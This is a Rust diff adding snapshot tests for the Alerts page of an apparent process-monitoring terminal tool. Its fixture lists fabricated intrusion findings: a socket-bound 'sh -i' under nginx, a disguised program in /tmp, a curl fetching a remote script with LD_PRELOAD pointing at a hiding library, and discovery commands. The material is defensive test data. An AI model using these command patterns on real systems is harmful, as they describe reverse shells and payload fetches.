@@ -4632,3 +4632,212 @@ fn startup_items_drop_columns_on_a_narrow_screen() -> Result<()> {
     check("startup_items_narrow", &stage, buffer)?;
     Ok(())
 }
+
+/// Alerts as the watcher would have written them: a remote shell it froze, a program running from
+/// a temporary folder, a forced library, a run of discovery commands, and a start left running
+/// because somebody may be working in that terminal.
+fn alert_log() -> borg_core::AlertLog {
+    use borg_core::{
+        AlertLog, Allowance, Ancestor, Evidence, ProcessKey, Protection, Response, StartedProcess, StreamKind,
+        WatchFinding, WatchSource, WatchStatus,
+    };
+    let at = |stamp: &str| -> SystemTime {
+        let stamp: jiff::Timestamp = stamp.parse().expect("a readable moment");
+        SystemTime::from(stamp)
+    };
+    let parent = |pid: u32, program: &str, terminal: bool| Ancestor {
+        pid,
+        name: PathBuf::from(program).file_name().expect("a program").to_string_lossy().into_owned(),
+        program: Some(program.into()),
+        terminal,
+        command: program.to_owned(),
+    };
+    let process = |pid: u32, program: &str, command: &[&str], user: &str, ancestors: Vec<Ancestor>| StartedProcess {
+        key: ProcessKey { pid, start: u64::from(pid) * 100 },
+        name: PathBuf::from(program).file_name().expect("a program").to_string_lossy().into_owned(),
+        program: Some(program.into()),
+        command: command.iter().map(|argument| (*argument).to_owned()).collect(),
+        user: user.into(),
+        ancestors,
+        ..StartedProcess::default()
+    };
+    let learned = at("2026-01-08T09:00:00Z");
+    let mut log = AlertLog::watching(WatchStatus {
+        source: WatchSource::Kernel,
+        since: at("2026-01-01T09:00:00Z"),
+        learned_at: learned,
+        freeze: true,
+        seen: 48_120,
+        suppressed: 0,
+    });
+
+    let nginx = parent(812, "/usr/sbin/nginx", false);
+    let mut shell =
+        process(29_314, "/bin/sh", &["sh", "-i"], "www-data", vec![nginx.clone(), parent(1, "/sbin/init", false)]);
+    shell.input = StreamKind::Socket;
+    shell.output = StreamKind::Socket;
+    let id = log.add(
+        at("2026-01-15T11:58:12Z"),
+        WatchFinding::ShellOnSocket { shell: "sh".into() },
+        Response::Frozen,
+        shell,
+    );
+    if let Some(alert) = log.find(id) {
+        alert.evidence = Evidence {
+            connections: vec!["socket:[412233]".into(), "socket:[412240]".into()],
+            program_hash: Some("8c98028bf435d0af5ab8074969a7e4f7e136b30b53df80685e5763ea415d8fbe".into()),
+            hits: Vec::new(),
+            missing: None,
+        };
+    }
+
+    let miner = process(29_355, "/tmp/.x/kworker", &["/tmp/.x/kworker", "--quiet"], "www-data", vec![nginx.clone()]);
+    log.add(
+        at("2026-01-15T11:57:40Z"),
+        WatchFinding::ProgramInTempFolder { program: "kworker".into(), folder: "/tmp".into() },
+        Response::Frozen,
+        miner,
+    );
+
+    let curl =
+        process(29_301, "/usr/bin/curl", &["curl", "-s", "http://203.0.113.7/u.sh"], "www-data", vec![nginx.clone()]);
+    log.add(
+        at("2026-01-15T11:55:03Z"),
+        WatchFinding::PreloadSet {
+            program: "curl".into(),
+            variable: "LD_PRELOAD".into(),
+            value: "/tmp/libhide.so".into(),
+        },
+        Response::Alerted,
+        curl,
+    );
+
+    let python = parent(9_044, "/usr/bin/python3", false);
+    let discovery = process(29_288, "/usr/bin/whoami", &["whoami"], "deploy", vec![python]);
+    log.add(
+        at("2026-01-15T11:40:22Z"),
+        WatchFinding::DiscoveryRun { parent: "python3".into(), commands: 4, seconds: 20 },
+        Response::Spared(Protection::Terminal),
+        discovery,
+    );
+
+    let tmux = parent(2_210, "/usr/bin/tmux", true);
+    let mut typed = process(28_990, "/bin/bash", &["bash"], "me", vec![tmux]);
+    typed.terminal = Some("pts/2".into());
+    typed.input = StreamKind::Terminal;
+    typed.output = StreamKind::Terminal;
+    let id = log.add(
+        at("2026-01-14T21:10:00Z"),
+        WatchFinding::ParentNeverStartedIt { parent: "tmux".into(), program: "bash".into() },
+        Response::Spared(Protection::OnlyANotice),
+        typed,
+    );
+    if let Some(alert) = log.find(id) {
+        alert.seen = true;
+        alert.state = borg_core::AlertState::Allowed;
+    }
+    let _ = Allowance::default();
+    log
+}
+
+fn open_alerts(stage: &mut Stage) -> Result<()> {
+    stage.state.settings.preferences.process_watch = true;
+    let effects = borg_core::update(
+        &mut stage.state,
+        Msg::Key(KeyEvent::new(KeyCode::Char('l'), KeyModifiers::ALT)),
+        stage.started,
+    );
+    anyhow::ensure!(
+        effects.iter().any(|effect| matches!(effect, borg_core::Effect::Alerts { .. })),
+        "opening reads the alert log"
+    );
+    Ok(())
+}
+
+fn send_alerts(stage: &mut Stage) -> Result<()> {
+    let id = stage.state.alerts.pending.context("the page waits for its log")?;
+    let reply = borg_core::AlertsReply { log: alert_log(), notice: None };
+    stage.send(Msg::Alerts { id, result: Ok(reply) });
+    Ok(())
+}
+
+/// Alt-L opens the Alerts page, newest alert first, with the selected alert's reason, process and
+/// evidence beside the list; the filter narrows it and Alt-W gives the list the whole width.
+#[test]
+fn alerts_list_what_the_process_watcher_found_newest_first() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    open_alerts(&mut stage)?;
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "Reading the alert log")?;
+    check("alerts_loading", &stage, buffer)?;
+
+    send_alerts(&mut stage)?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Shell on a network socket")?;
+    ensure_text(&buffer, "Frozen")?;
+    check("alerts", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "LD_PRELOAD")?;
+    check("alerts_preload", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Char('/'))).send(Msg::Paste("www-data !temporary".into()));
+    let buffer = stage.render(stage.started)?;
+    assert_eq!(stage.state.alerts.len(), 2, "the web server's own alerts other than the temporary folder");
+    check("alerts_filter", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Enter)).send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(stage.started)?;
+    assert!(stage.state.alerts.expanded, "Alt-W gives the list the whole width");
+    check("alerts_expanded", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
+    assert!(!stage.state.alerts.is_open(), "Esc clears the filter, then closes the page");
+    Ok(())
+}
+
+/// K asks before it ends a process, since killing one cannot be taken back.
+#[test]
+fn alerts_ask_before_killing_a_frozen_process() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    open_alerts(&mut stage)?;
+    send_alerts(&mut stage)?;
+    stage.send(key(KeyCode::Char('k')));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Kill process")?;
+    check("alerts_confirm_kill", &stage, buffer)?;
+    Ok(())
+}
+
+/// With the watcher turned off the page says how to turn it on, and on a narrow screen the list
+/// keeps the time, the rule and the program.
+#[test]
+fn alerts_say_when_nothing_is_watching_and_drop_columns_on_a_narrow_screen() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 80, rows: 20 }, Motion::STILL)?;
+    let effects = borg_core::update(
+        &mut stage.state,
+        Msg::Key(KeyEvent::new(KeyCode::Char('l'), KeyModifiers::ALT)),
+        stage.started,
+    );
+    let id = effects
+        .iter()
+        .find_map(|effect| match effect {
+            borg_core::Effect::Alerts { id, .. } => Some(*id),
+            _ => None,
+        })
+        .context("opening reads the alert log")?;
+    let empty = borg_core::AlertsReply { log: borg_core::AlertLog::default(), notice: None };
+    stage.send(Msg::Alerts { id, result: Ok(empty) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Watch")?;
+    check("alerts_watcher_off", &stage, buffer)?;
+
+    stage.state.settings.preferences.process_watch = true;
+    stage.send(key(KeyCode::Char('r')));
+    send_alerts(&mut stage)?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "11:58")?;
+    check("alerts_narrow", &stage, buffer)?;
+    Ok(())
+}
